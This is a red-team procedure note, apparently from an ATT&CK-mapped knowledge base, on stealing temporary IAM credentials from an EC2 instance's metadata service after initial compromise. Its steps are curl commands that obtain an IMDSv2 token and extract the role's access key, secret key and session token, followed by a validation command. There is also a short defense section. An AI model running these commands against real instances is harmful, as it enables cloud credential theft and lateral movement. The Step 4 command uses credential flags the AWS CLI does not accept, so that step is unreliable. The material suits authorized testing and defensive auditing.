---
id: c7b1d7e7-7edc-4a57-9900-908c48873cec
name: Retrieve-AWS-EC2-Instance-Credentials-via-Metadata-Service
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:13.347335+00:00'
updated_at: '2023-04-10T20:20:07.318297+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Credentials in Files|T1081 - Credentials in Files]]'
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/AWS Metadata]]'
  - '[[tags/Cloud - AWS]]'
  - '[[tags/Exploitation]]'
  - '[[tags/Grabbing the keys to access the instance]]'
  - '[[tags/Remote code execution]]'
commands:
  - '[[commands/curl-retrieve-ec2-security-credentials]]'
platforms:
  - AWS
  - Linux
tools: []
validated: true
---

# Retrieve-AWS-EC2-Instance-Credentials-via-Metadata-Service

## Summary

This procedure demonstrates how to extract temporary AWS security credentials from an EC2 instance's metadata service. By querying the instance metadata endpoint, attackers can obtain access keys, secret keys, and session tokens associated with the instance's IAM role, enabling further lateral movement or privilege escalation within the AWS environment without needing prior credentials.

## Description

The AWS Instance Metadata Service (IMDS) runs on every EC2 instance at the link-local address 169.254.169.254 and provides information about the instance, including temporary security credentials if an IAM role is attached. Attackers who gain initial access to an EC2 instance (e.g., via SSH, RCE, or compromised credentials) can exploit this service to retrieve credentials. These credentials are short-lived (typically 6 hours) but can be used to interact with other AWS services like S3, EC2, or IAM. This technique is particularly effective in cloud environments where instances assume roles for least-privilege access, but misconfigurations allow metadata access. Use this in red team scenarios to simulate credential theft after initial foothold, or for defensive auditing to identify exposed metadata endpoints.

## Requirements

1. Compromised access to a running EC2 instance (e.g., shell access via SSH or RCE).
2. The EC2 instance must have an attached IAM role with temporary credentials enabled (IMDSv1 or IMDSv2).
3. curl or another HTTP client installed on the instance (standard on most Linux distributions).
4. Network connectivity to the metadata service endpoint (localhost link-local address).

## Defense

Defensive measures and detection strategies:

- Disable IMDSv1 and enforce IMDSv2 with a required token to prevent unauthenticated access; use AWS SSM or instance profiles to limit exposure.
- Attach minimal IAM roles to EC2 instances following least-privilege principles, and regularly rotate credentials.
- Monitor CloudTrail logs for unauthorized API calls using stolen credentials, and enable AWS GuardDuty for metadata service abuse detection.
- Use network ACLs or security groups to restrict metadata endpoint access if possible, and implement host-based controls like AppArmor or SELinux to limit process capabilities.

## Objectives

1. Extract temporary AWS access keys, secret access key, and session token from the EC2 metadata service.
2. Escalate privileges by using the retrieved credentials to access other AWS resources.
3. Demonstrate lateral movement potential within the AWS cloud environment.

## Instructions

### Step 1: Verify EC2 Instance Metadata Service Availability

**Context**: Before attempting credential retrieval, confirm that the instance is running on EC2 and the metadata service is accessible. This step ensures you're on a valid target and helps identify the IMDS version (v1 or v2), as v2 requires a session token.

**Command** ([[commands/curl-retrieve-ec2-security-credentials]] with basic endpoint):
```bash
curl http://169.254.169.254/latest/meta-data/
```

> This command queries the root metadata endpoint. If IMDSv2 is enforced, it will fail without a token—indicating a more secure setup. For IMDSv1, it returns a list of available metadata categories. If the command times out or returns nothing, the instance may not be EC2 or metadata is blocked.

### Step 2: Obtain IMDSv2 Session Token (If Required)

**Context**: For instances using IMDSv2, generate a one-time session token to authenticate subsequent metadata requests. This prevents blind access and adds a layer of protection; skip if IMDSv1 is in use (detected from Step 1).

**Command** ([[commands/curl-retrieve-ec2-security-credentials]] for token):
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```

> The token is valid for up to 6 hours (21600 seconds). Store it in a variable for use in headers of follow-up requests. Expected response is a long alphanumeric token string if successful; an empty response indicates IMDSv2 is not configured or access is denied.

### Step 3: Retrieve Instance Profile Credentials

**Context**: Query the security credentials endpoint using the instance's IAM role name (often 'ec2-instance' or similar; discover it from Step 1 output under 'iam/security-credentials/'). This extracts the temporary credentials, which can then be exported as environment variables for use with AWS CLI or SDKs.

**Command** ([[commands/curl-retrieve-ec2-security-credentials]] for credentials):
```bash
if [ -n "$TOKEN" ]; then
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance
else
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance
fi
```

> Replace 'ec2-instance' with the actual role name if different. The output is JSON containing AccessKeyId, SecretAccessKey, and Token. If no role is attached, it returns a 404 error. Export the values (e.g., export AWS_ACCESS_KEY_ID=...) to use them immediately for API calls.

### Step 4: Validate Retrieved Credentials

**Context**: Test the credentials to confirm they work and assess the attached permissions. This verifies success and reveals the scope of access (e.g., S3 read/write, EC2 control).

**Command** ([[commands/curl-retrieve-ec2-security-credentials]] with AWS CLI test):
```bash
aws sts get-caller-identity --access-key-id $AWS_ACCESS_KEY_ID --secret-access-key $AWS_SECRET_ACCESS_KEY --token $AWS_SESSION_TOKEN
```

> Assumes AWS CLI is installed; if not, use curl to query STS directly. Expected output includes the assumed role ARN and account ID, confirming valid credentials. Errors like 'InvalidClientTokenId' indicate expired or invalid tokens.
